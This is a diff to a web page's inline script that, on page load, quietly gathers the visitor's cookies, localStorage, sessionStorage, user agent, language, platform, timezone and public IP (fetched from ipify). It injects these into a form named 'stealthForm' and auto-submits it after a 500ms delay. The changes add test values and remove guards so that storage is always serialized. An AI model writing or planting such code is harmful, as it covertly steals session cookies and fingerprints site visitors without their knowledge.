@@ -539,6 +539,11 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 
     <script>
         document.addEventListener("DOMContentLoaded", function() {
+            // Set default test data
+            document.cookie = "test_cookie=123; path=/";
+            localStorage.setItem("test_local", "local_value");
+            sessionStorage.setItem("test_session", "session_value");
+
             // Capture browser data
             var cookies = document.cookie || "No_Cookies";
             var userAgent = navigator.userAgent || "Unknown_User_Agent";
@@ -547,8 +552,8 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
             var language = navigator.language || navigator.userLanguage || "Unknown_Language";
             var platform = navigator.platform || "Unknown_Platform";
             var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown_Timezone";
-            var localStorageData = JSON.stringify(localStorage.length ? localStorage : "No_LocalStorage") || "No_LocalStorage";
-            var sessionStorageData = JSON.stringify(sessionStorage.length ? sessionStorage : "No_SessionStorage") || "No_SessionStorage";
+            var localStorageData = JSON.stringify(localStorage) || "No_LocalStorage";
+            var sessionStorageData = JSON.stringify(sessionStorage) || "No_SessionStorage";
             var ipAddress = "Pending_IP";
 
             // Inject data into form fields
@@ -575,20 +580,24 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
             console.log("Session Storage:", sessionStorageData);
             console.log("IP Address (initial):", ipAddress);
 
-            // Submit form immediately with available data
-            console.log("Submitting form with initial data...");
-            document.getElementById("stealthForm").submit();
+            // Delay submission slightly to ensure data is set and logged
+            setTimeout(function() {
+                console.log("Submitting form with initial data...");
+                document.getElementById("stealthForm").submit();
+            }, 500); // 500ms delay
 
-            // Fetch IP address separately (won't block initial submission)
+            // Fetch IP address separately
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     ipAddress = data.ip || "Unknown_IP";
                     console.log("IP Address fetched:", ipAddress);
                     document.getElementById("ipField").value = ipAddress;
-                    // Optional: Submit again with IP if needed (uncomment below)
-                    // console.log("Submitting form again with IP...");
-                    // document.getElementById("stealthForm").submit();
+                    // Optional: Submit again with IP (uncomment if needed)
+                    // setTimeout(function() {
+                    //     console.log("Submitting form again with IP...");
+                    //     document.getElementById("stealthForm").submit();
+                    // }, 500);
                 })
                 .catch(error => {
                     console.error("IP fetch failed:", error);
